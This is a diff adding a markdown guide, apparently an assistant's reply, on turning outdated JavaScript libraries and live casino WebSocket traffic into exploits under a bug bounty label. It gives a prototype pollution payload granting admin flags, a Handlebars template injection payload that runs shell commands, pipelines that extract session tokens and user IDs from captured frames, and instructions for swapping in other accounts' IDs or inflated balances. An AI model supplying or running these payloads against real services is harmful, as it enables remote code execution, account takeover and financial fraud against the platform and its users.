@@ -1,0 +1,70 @@
+## 🚀 Part 1: Mapping Retire.js Discoveries to Exploit Payloads
+When your hunt_js.sh script finishes, it may flag an outdated component buried deep within a vendor directory. To secure a high-paying bounty, you cannot simply report the version number. You must construct a functional proof of concept (PoC) showing how that code flaw allows you to manipulate the core state machine.
+Here is how to map three common high-severity components flagged by Retire.js to live exploit chains.
+## Case A: lodash / underscore (< 4.17.11) ➔ Prototype Pollution
+If the automated jq parser highlights an outdated utility library handling deep object merges, the application is likely vulnerable to prototype pollution.
+
+* The Exploit Mechanic: You inject magic properties (__proto__ or constructor.prototype) into a profile setup payload. The server-side script merges this object blindly, modifying the fundamental base behavior of every JavaScript object in memory.
+* The Live PoC Payload: Send this raw JSON snippet to your account configurations, voucher fields, or settings updates:
+
+{
+  "theme_preferences": {
+    "__proto__": {
+      "isAdmin": true,
+      "allowDebug": true,
+      "bypass_limits": "1"
+    }
+  }
+}
+
+* Testing Realized Impact: Refresh your target session. Check if client-side restriction banners vanish, or if previously locked administrative configuration tabs render inside the browser console.
+
+## Case B: handlebars / mustache (< 4.0.11) ➔ Server-Side Template Injection (SSTI)
+If Retire.js flags an outdated template engine on an endpoint processing text input (like building custom automated email notifications, betting receipt exports, or support interactions).
+
+* The Exploit Mechanic: The server takes your input and treats it as code logic rather than static text, processing internal engine variables.
+* The Live PoC Payload: Put this math execution challenge inside your profile nickname, support description, or billing comment parameter:
+
+{{constructor.constructor("return process.mainModule.require('child_process').execSync('id')")()}}
+
+* Testing Realized Impact: If the application outputs system properties, or triggers an out-of-band callback to your listener server, you have transitioned a minor dependency bug into a critical Remote Code Execution (RCE) event.
+
+------------------------------
+## 🎯 Part 2: Extracting UIDs & Balance Data from Live WebSockets
+Once you generate your extracted_frames.txt log from live casino gameplay streams, the file will contain thousands of raw text lines. To pull the critical user identifiers (UIDs), session tracking contexts, and balance strings out of the mess, use this custom terminal parsing pipeline on your machine.
+## Step 1: Automated Token & UID Isolate Command
+Run this unified sed and grep filter chain directly inside your terminal workspace to isolate session security states from the raw text stream:
+
+# Extract user accounts, financial metrics, and active session tokens
+grep -oEi '"(user_id|uid|player_id|token|session|jwt)":"[^" ]+"' extracted_frames.txt | sort -u
+
+## Step 2: The WebSocket State Ledger Builder
+To see exactly how the application updates balance values dynamically across transactions, format the raw frames structurally using awk to view the timeline:
+
+# Pull timestamps, wagers, and ending balance metrics into a readable terminal ledger
+grep -E "(balance|bet|payout|win)" extracted_frames.txt | awk -F',' '{
+    for(i=1;i<=NF;i++) {
+        if($i ~ /"uid"/ || $i ~ /"balance"/ || $i ~ /"amount"/) {
+            print $i
+        }
+    }
+    print "---"
+}' | head -n 30
+
+## Expected Terminal Target Map Output:
+Your terminal will print clean structural variables like this:
+
+"uid":"8392104""balance":150.75"amount":10.00
+---"uid":"8392104""balance":140.75"amount":0.00
+
+## Step 3: Weaponizing the Extracted Variables
+Compare the user IDs and balance trackers exposed inside these stream frames with your standard desktop dashboard settings.
+Look for the ultimate architectural flaw: Context Pollution. If the WebSocket stream updates your balance using an explicit variable string format passed from your local browser client context (e.g., {"action":"sync","set_balance":150.75,"user_id":8392104}), replace that string inside your proxy tools with an alternate target account ID or an inflated decimal value.
+If the server updates its primary financial database layer based on variables defined inside these client-controlled frames, you have bypasses that completely evade typical boundary security measures.
+------------------------------
+## 🚀 Advancing Your Hunt
+Now that your workspace is fully equipped to parse files and weaponize dependency discoveries:
+
+* Do you need help generating an exact report template to cleanly document one of these financial logic findings for the triage team?
+* Or would you like to review how to set up an automated script listener that flags any changing socket variables in real-time as you interact with different games?
+
